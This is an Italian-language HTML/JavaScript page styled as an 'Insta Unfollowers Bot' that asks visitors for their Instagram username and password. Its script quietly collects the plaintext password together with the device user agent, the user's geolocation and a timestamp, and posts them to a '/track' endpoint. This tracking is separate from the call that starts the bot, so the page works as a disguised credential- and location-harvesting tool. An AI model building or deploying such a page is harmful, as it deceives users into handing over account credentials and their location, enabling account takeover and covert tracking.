<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Insta Bot</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
<div class="container">
    <h1>📸 Insta Unfollowers Bot</h1>
    <input type="text" id="username" placeholder="Username Insta">
    <input type="password" id="password" placeholder="Password Insta">
    <button onclick="startBot()">Avvia Bot</button>
    <p id="status"></p>
</div>

<script>
function startBot() {
    const btn = document.querySelector("button");
    btn.disabled = true;

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const device = navigator.userAgent;

    document.getElementById("status").innerText = "Avvio bot...";

    // Prima prova a prendere la posizione
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            sendData(username, password, device, pos.coords.latitude, pos.coords.longitude);
        },
        (err) => {
            // Se l'utente nega, invia comunque senza posizione
            sendData(username, password, device, null, null);
        }
    );

    // funzione interna per inviare i dati
    function sendData(username, password, device, lat, lon) {
        const clicked = "Avvia Bot";
        const timestamp = new Date().toISOString();

        // manda i dati a /track
        fetch("/track", {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password, device, lat, lon, clicked, timestamp })
        }).then(res => res.text())
          .then(console.log);

        // avvia il bot
        fetch("/start", {
            method: "POST",
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        })
        .then(res => res.text())
        .then(data => {
            document.getElementById("status").innerText = data;
            btn.disabled = false;
        })
        .catch(err => {
            document.getElementById("status").innerText = "Errore durante l'avvio del bot.";
            btn.disabled = false;
        });
    }
}
</script>
</body>
</html>
